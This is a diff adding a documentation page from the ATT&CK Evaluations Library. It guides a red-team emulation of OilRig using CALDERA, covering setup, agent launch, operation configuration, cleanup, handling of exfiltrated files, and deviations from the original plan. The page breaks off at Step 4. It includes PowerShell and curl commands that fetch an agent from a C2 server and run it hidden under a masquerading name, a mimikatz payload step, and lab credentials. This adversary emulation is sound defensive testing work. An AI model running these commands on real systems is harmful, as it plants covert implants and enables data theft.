@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.771964962339">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.5.0">
+
+    <!-- Primary Meta Tags -->
+    <title>DEPENDENCIES</title>
+    <meta name="title" content="DEPENDENCIES">
+    <meta name="description" content="Linux/Mac OS, 64-bit">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/managedservices/oilrig/emulation_plan/yaml/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/managedservices/oilrig/emulation_plan/yaml/">
+    <meta property="og:title" content="DEPENDENCIES">
+    <meta property="og:description" content="Linux/Mac OS, 64-bit">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/managedservices/oilrig/emulation_plan/yaml/">
+    <meta property="twitter:title" content="DEPENDENCIES">
+    <meta property="twitter:description" content="Linux/Mac OS, 64-bit">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.5.0.771964962339" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library Overview
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Managed Services
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../managedservices/oilrig/" class="pr-4">
+                                                Oil​Rig
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../managedservices/oilrig/emulation_plan/" class="pr-4">
+                                                Scenario Overview
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../managedservices/oilrig/emulation_plan/yaml/" class="pr-4">
+                                                DEPENDENCIES
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="dependencies" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dependencies">#</doc-anchor-trigger>
+        <span>DEPENDENCIES</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../categories/managed-services/">managed-services</a></div>
+</div>
+
+<doc-anchor-target id="caldera-c2-server">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#caldera-c2-server">#</doc-anchor-trigger>
+        <span>CALDERA C2 Server</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>Linux/Mac OS, 64-bit</li>
+<li>git commandline installed</li>
+<li>python3.7+ with pip3
+<ul>
+<li>python3.9+ recommended</li>
+</ul>
+</li>
+<li>golang 1.17+
+<ul>
+<li>required for dynamic agent compilation</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="attacker-machine-dependencies">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#attacker-machine-dependencies">#</doc-anchor-trigger>
+        <span>Attacker Machine Dependencies</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>Linux OS, 64-bit
+<ul>
+<li>Kali recommended</li>
+<li>Can be the same machine as the CALDERA C2 server if needed.</li>
+</ul>
+</li>
+<li>Command-line tools
+<ul>
+<li>xfreerdp</li>
+<li>xdotools</li>
+<li>curl</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="setup">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span>SETUP</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="download-and-install-caldera">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#download-and-install-caldera">#</doc-anchor-trigger>
+        <span>Download and Install CALDERA</span>
+    </h2>
+</doc-anchor-target>
+<p>Run the following on a Linux/Mac machine of your choice. This machine will act as your C2 server, or the &quot;attacker&quot; host. For the purposes of this walkthrough, the C2 server will have an IP address of 192.168.0.4.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">git clone --depth 1 https://github.com/mitre/caldera.git --recursive
+cd caldera
+git checkout master &amp;&amp; git pull
+cp conf/default.yml conf/local.yml</code></pre>
+</doc-codeblock></div>
+<p>Add the <code v-pre>emu</code> plugin add emu to your <code v-pre>conf/local.yml</code> configuration file. Feel free to enable or disable other plugins
+by adding/removing them from the configuration file. You can also configure your user accounts and credentials if needed.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">vi conf/local.yml</code></pre>
+</doc-codeblock></div>
+<p>Download pip dependencies.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">pip3 install --upgrade setuptools
+pip3 install --upgrade pip
+pip3 install -r requirements.txt</code></pre>
+</doc-codeblock></div>
+<p>Download required payloads for <code v-pre>emu</code> plugin.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"># from caldera/plugins/emu directory 
+
+git checkout master &amp;&amp; git pull
+./download_payloads.sh</code></pre>
+</doc-codeblock></div>
+<p>Run your C2 server from the caldera directory. This will unzip encrypted executables throughout the <code v-pre>adversary-emulation-library</code> and ingest its emulation plans.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"># from caldera directory
+
+python3 server.py --insecure --log DEBUG</code></pre>
+</doc-codeblock></div>
+<p>Update payload name for mimikatz to <code v-pre>m64.exe</code>. <strong>Note:</strong> this may require a server restart for Caldera to pick up the new payload.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"># from caldera/plugins/emu directory
+
+cp payloads/mimikatz.exe m64.exe</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="running-the-operation">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#running-the-operation">#</doc-anchor-trigger>
+        <span>RUNNING THE OPERATION</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="launch-agents">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#launch-agents">#</doc-anchor-trigger>
+        <span>Launch Agents</span>
+    </h2>
+</doc-anchor-target>
+<p>Launch the first agent by running the following command on 10.1.0.5 (THEBLOCK) as the user <code v-pre>gosta</code>. The password for <code v-pre>gosta</code> is <code v-pre>d0ntGoCH4ingW8trfalls</code>. Note that you may need to replace <code v-pre>gosta</code> with the applicable username, if you are not using the <code v-pre>gosta</code> user. This agent is meant to replace SideTwist payload used in the original scenario.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">mkdir  &quot;C:\Users\gosta\AppData\local\SystemFailureReporter&quot;;
+cd  &quot;C:\Users\gosta\AppData\local\SystemFailureReporter&quot;;
+$server=&quot;http://192.168.0.4:8888&quot;; # change IP address for your CALDERA C2 server according to your environment
+$url=&quot;$server/file/download&quot;;
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add(&quot;platform&quot;,&quot;windows&quot;);
+$wc.Headers.add(&quot;file&quot;,&quot;sandcat.go&quot;);
+$data=$wc.DownloadData($url);
+get-process | ? {$_.modules.filename -like &quot;C:\Users\Public\SystemFailureReporter.exe&quot;} | stop-process -f;
+rm -force &quot;C:\Users\Public\SystemFailureReporter.exe&quot; -ea ignore;
+[io.file]::WriteAllBytes(&quot;C:\Users\Public\SystemFailureReporter.exe&quot;,$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\SystemFailureReporter.exe -ArgumentList &quot;-server $server -group gosta&quot; -WindowStyle hidden;</code></pre>
+</doc-codeblock></div>
+<p>RDP to 192.168.0.4, the Kali attacker host, as user <code v-pre>saka</code> with password <code v-pre>ceKa#zUUc4^9yZ</code>. You may need to modify the command so the <code v-pre>server</code> value matches your attacker host&#x27;s IP address. Launch the second agent by running the following command. <strong>Note:</strong> keep this RDP open as this will be leveraged by <code v-pre>xfreerdp</code> in the executed Caldera operation.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"># from the caldera directory
+
+cd &quot;plugins/emu/data/adversary-emulation-library/oilrig/Resources/payloads/TwoFace&quot;;
+server=&quot;http://192.168.0.4:8888&quot;;
+curl -s -X POST -H &quot;file:sandcat.go&quot; -H &quot;platform:linux&quot; $server/file/download &gt; splunkd;
+chmod +x splunkd;
+./splunkd -server $server -group kali -v</code></pre>
+</doc-codeblock></div>
+<p>Log into CALDERA&#x27;s web GUI by accessing your C2 server address in a web browser (Chrome recommended), and using your credentials (default username is <code v-pre>red</code>, default password is <code v-pre>admin</code>).</p>
+<p>Make sure you can see your agents after clicking the <code v-pre>agents</code> option on the menu on the left, under &quot;Campaigns&quot;.</p>
+<p>For best results, make sure you don&#x27;t have other agents currently beaconing in.</p>
+<doc-anchor-target id="planner">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#planner">#</doc-anchor-trigger>
+        <span>Planner</span>
+    </h2>
+</doc-anchor-target>
+<p>This port requires CALDERA to run each ability on a specific agent. For example, some abilities should run only on the <code v-pre>gosta</code> group of agents, while other abilities should run only on the <code v-pre>kali</code> group of agents. Therefore, this port uses a <a href="emulation_plan/yaml/planners/oilrig_planner.yml">custom planner</a> which specifies the agent group that should run each ability.</p>
+<p>The commands to start agents will include a <code v-pre>-group</code> flag to specify the agent&#x27;s group. This group will correspond to the group listed in the custom planner. If the groups that are specified in <doc-anchor-trigger to="#launch-agents">Launch Agents</doc-anchor-trigger> are edited, the group names in the planner will need to be updated correspondingly.</p>
+<doc-anchor-target id="fact-setup">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#fact-setup">#</doc-anchor-trigger>
+        <span>Fact Setup</span>
+    </h2>
+</doc-anchor-target>
+<p>Before running the operation, you will need to make sure that the OilRig fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under <code v-pre>Configuration</code>, select <code v-pre>fact sources</code>. Under the &quot;Select a source&quot; drop-down menu, select <code v-pre>OilRig (Emu)</code>, which is the fact source for the OilRig adversary. From there, update the following facts as needed:</p>
+<ul>
+<li><code v-pre>initial.target.user</code>: The username of the initial target.</li>
+<li><code v-pre>initial.target.password</code>: The password of the initial target.</li>
+<li><code v-pre>second.target.host</code>: The hostname address of the second target.</li>
+<li><code v-pre>second.target.ip</code>: The IPv4 address of the Exchange server.</li>
+<li><code v-pre>network.domain.name</code>: The network domain name for initial target system</li>
+<li><code v-pre>caldera.server.ip</code>: The IPv4 address of the attacker system.</li>
+<li><code v-pre>caldera.user.password</code>: The password for the attacker system.</li>
+<li><code v-pre>caldera.user.name</code>: The username of the attacker system.</li>
+<li><code v-pre>second.target.user</code>: The username for the SQL server administrator.</li>
+<li><code v-pre>second.target.ntlm</code>: NTLM hash value for the user of the SQL server administrator.</li>
+<li><code v-pre>third.target.ip</code>: The IPv4 address of the SQL server.</li>
+<li><code v-pre>exfil.target.email</code>: The adversary-controlled email address used to exfiltrate data.</li>
+<li><code v-pre>server.api.key</code>: The API key for the CALDERA server.</li>
+</ul>
+<doc-anchor-target id="operation-setup">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#operation-setup">#</doc-anchor-trigger>
+        <span>Operation Setup</span>
+    </h2>
+</doc-anchor-target>
+<p>After adjusting the fact source as needed, select <code v-pre>operations</code> from the left menu, under &quot;Campaigns&quot;.</p>
+<p>Select &quot;+ Create Operation&quot; to the right of the drop-down menu.</p>
+<p>Add in an appropriate name for your operation.</p>
+<p>For the adversary profile, select <code v-pre>OilRig</code>.</p>
+<p>For the Fact Source, select <code v-pre>OilRig (Emu)</code>.</p>
+<p>Select <code v-pre>Advanced</code> to expand the Advanced configurations.</p>
+<p>For <code v-pre>Group</code>, make sure <code v-pre>All Groups</code> is selected.</p>
+<p>For the Planner, select <code v-pre>OilRig Planner</code>.</p>
+<p>Make sure the <code v-pre>plain-text</code> obfuscator is selected.</p>
+<p>For Autonomous, make sure &quot;Run Autonomously&quot; is selected.</p>
+<p>For the Parser, select &quot;Do not use default parsers&quot;.</p>
+<p>For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.</p>
+<p>For Run state, make sure &quot;Run immediately&quot; is selected.</p>
+<p>Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.</p>
+<p>Keep visibility at 51.</p>
+<p>When ready, hit the Start button and wait for your operation to complete.</p>
+<doc-anchor-target id="terminating-the-operation">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#terminating-the-operation">#</doc-anchor-trigger>
+        <span>TERMINATING THE OPERATION</span>
+    </h1>
+</doc-anchor-target>
+<p>Press the stop button in the operation GUI to finish the operation. Terminate the Kali agent from the GUI or RDP/SSH into the machine to stop the agent processes.</p>
+<doc-anchor-target id="cleanup">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup">#</doc-anchor-trigger>
+        <span>Cleanup</span>
+    </h2>
+</doc-anchor-target>
+<p>The following commands should be run on 10.1.0.5 (THEBLOCK):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">del C:\Users\Public\contact.aspx;
+del C:\Users\gosta\AppData\local\SystemFailureReporter;
+del C:\Users\Public\SystemFailureReporter.exe;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="exfiltrated-files">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#exfiltrated-files">#</doc-anchor-trigger>
+        <span>Exfiltrated Files</span>
+    </h2>
+</doc-anchor-target>
+<p>Throughout the operation, some files will be exfiltrated through a CALDERA agent back to the CALDERA server.</p>
+<p>The directory on the CALDERA server machine that contains the uploaded files depends on the <code v-pre>exfil_dir</code> setting within the CALDERA configuration file (<code v-pre>/tmp/caldera</code> by default). Within this exfil directory, you&#x27;ll find a subdirectory of the format <code v-pre>hostname-agentidentifier</code>, where <code v-pre>hostname</code> is the hostname where the agent was running, and the agent identifier is the unique identifier for the agent. The encrypted uploaded files will be in that subdirectory.</p>
+<p>To decrypt the uploaded files, you can use the decryption utility provided in <code v-pre>app/utility/file_decryptor.py</code> within the CALDERA main directory. Run it and pass in the path to the CALDERA configuration file used (e.g. <code v-pre>default.yml</code> or <code v-pre>local.yml</code>) as well as the path to the input file and output file (change file paths in the example as needed).</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">python3 ~/caldera/app/utility/file_decryptor.py -c ~/caldera/conf/local.yml /tmp/caldera/gammu-agent123/encrypted_exfil.file decrypted_exfil.file</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="modificationsdeviations-from-the-original-emulation-plan">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#modificationsdeviations-from-the-original-emulation-plan">#</doc-anchor-trigger>
+        <span>MODIFICATIONS/DEVIATIONS FROM THE ORIGINAL EMULATION PLAN</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="step-1">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1">#</doc-anchor-trigger>
+        <span>Step 1</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>Initial access will be performed by running a CALDERA agent executable named <code v-pre>SystemFailureReporter.exe</code>, rather than a malicious Word document with VBA macros. The agent will act as the remote access implant and is a compiled <code v-pre>.exe</code> written in Golang.
+<ul>
+<li>The SideTwist payload, <code v-pre>update.xml</code>, and <code v-pre>b.doc</code> will not be used</li>
+<li><code v-pre>SystemFailureReporter.exe</code> as used in evals will be replaced by the CALDERA agent named <code v-pre>SystemFailureReporter.exe</code>.</li>
+</ul>
+</li>
+<li>Following initial access, the agent will use two VBS scripts to collect the <code v-pre>hostname</code> and <code v-pre>username</code> environment variables, mimicking the macro used in evals.</li>
+<li>The agent will not perform sandbox detection checks using <code v-pre>Application.MouseAvailable</code>.</li>
+<li>The agent will not use GetUserName API, GetComputerName API, and GetDomainName API to find the current user, hostname, and domain respectively.</li>
+</ul>
+<doc-anchor-target id="step-2">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2">#</doc-anchor-trigger>
+        <span>Step 2</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>The CALDERA agent will run all of the commands in Step 2 via <code v-pre>cmd.exe</code>. However, the commands will be executed separately instead of being chained together. From a defender&#x27;s viewpoint, the port&#x27;s execution will appear as:
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">SystemFailureReporter.exe executed cmd.exe /C whoami
+SystemFailureReporter.exe executed cmd.exe /C hostname
+SystemFailureReporter.exe executed cmd.exe /C ipconfig /all
+...</code></pre>
+</doc-codeblock></div>
+as opposed to the scenario&#x27;s execution, which would have appeared as:
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">SystemFailureReporter.exe executed cmd.exe whoami &amp; hostname &amp; ipconfig /all ... 2&gt;&amp;1</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="step-3">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3">#</doc-anchor-trigger>
+        <span>Step 3</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li><code v-pre>b.exe</code> will be downloaded to the workstation as a payload from the CALDERA server. In the port, <code v-pre>b.exe</code> will be automatically deleted when it stops running, as opposed the original scenario, where <code v-pre>b.exe</code> is deleted in Step 11.</li>
+<li><code v-pre>fsociety.dat</code> will be exfiltrated via the C2 channel to the CALDERA exfil directory, which is by default <code v-pre>/tmp/caldera</code> on the CALDERA server host. More information regarding exfiltrated files is available <doc-anchor-trigger to="#exfiltrated-files">above</doc-anchor-trigger>.</li>
+</ul>
+<doc-anchor-target id="step-4">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4">#</doc-anchor-trigger>
+        <span>Step 4</span>
+    </h2>
+</doc-anchor-target>
+<ul>
